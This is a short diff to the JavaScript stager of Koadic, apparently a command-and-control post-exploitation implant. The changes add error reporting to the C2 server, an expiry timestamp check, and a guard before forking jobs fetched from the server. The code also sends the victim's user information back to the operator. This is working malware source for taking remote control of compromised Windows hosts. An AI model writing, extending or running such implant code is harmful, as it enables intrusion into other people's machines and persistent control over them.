Updated by Library Project Script . 20190602

+++ data/stager/js/stage.js
@@ -12,7 +12,11 @@ try
 
         Koadic.work.report(Koadic.user.info());
 
-        Koadic.work.fork("");
+        try {
+          Koadic.work.fork("");
+        } catch (e) {
+          Koadic.work.error(e)
+        }
         Koadic.exit();
     }
     else
@@ -26,20 +30,30 @@ try
 catch (e)
 {
     // todo: critical error reporting
+    Koadic.work.error(e);
 }
 
 function DoWork()
 {
+
+    var epoch = new Date().getTime();
+    var expire = parseInt(Koadic.EXPIRE);
+    if (epoch > expire)
+    {
+        return false;
+    }
+
     try
     {
         var work = Koadic.work.get();
-
         // 201 = x64 or x86
         // 202 = force x86
         if (work.status == 201 || work.status == 202)
         {
-            var jobkey = work.responseText;
-            Koadic.work.fork(jobkey, work.status == 202);
+            if (work.responseText.length > 0) {
+                var jobkey = work.responseText;
+                Koadic.work.fork(jobkey, work.status == 202);
+            }
         }
         else // if (work.status == 500) // kill code
         {
